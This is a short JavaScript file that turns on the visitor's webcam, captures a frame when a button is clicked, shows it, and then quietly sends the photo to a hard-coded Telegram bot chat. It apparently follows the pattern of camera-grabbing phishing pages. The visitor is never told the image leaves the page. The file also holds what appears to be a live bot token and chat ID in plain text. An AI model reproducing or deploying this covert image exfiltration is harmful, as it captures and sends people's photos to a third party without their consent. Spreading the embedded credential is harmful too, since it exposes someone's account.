// Get the video element, canvas element, and capture button
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureButton = document.getElementById('capture');
const resultDiv = document.getElementById('result');

// Telegram Bot Token (replace with your bot's token)
const botToken = '6636786698:AAFJmVfEd1CIYP-6BZlNlF-ia84TopX-g5E';
const chatId = '6069933382';  // Replace with your chat ID (can be your own or a group chat)

// Access the user's webcam and display it on the video element
navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(stream) {
        video.srcObject = stream;
    })
    .catch(function(error) {
        console.error('Error accessing the camera: ', error);
    });

// Capture the image when the button is clicked
captureButton.addEventListener('click', function() {
    // Set canvas size equal to the video size
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw the current frame from the video onto the canvas
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Get the image data from the canvas and convert it to a data URL
    const dataUrl = canvas.toDataURL('image/png');

    // Display the captured image in the result div
    resultDiv.innerHTML = `<img src="${dataUrl}" alt="Captured Image" />`;

    // Send image to Telegram
    sendToTelegram(dataUrl);
});

// Function to send the image to Telegram
function sendToTelegram(imageData) {
    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

    // Prepare the form data
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', imageData);  // Send the captured image as base64

    // Send a POST request to the Telegram Bot API
    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('Image sent to Telegram!');
        } else {
            console.error('Failed to send image to Telegram:', data);
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}
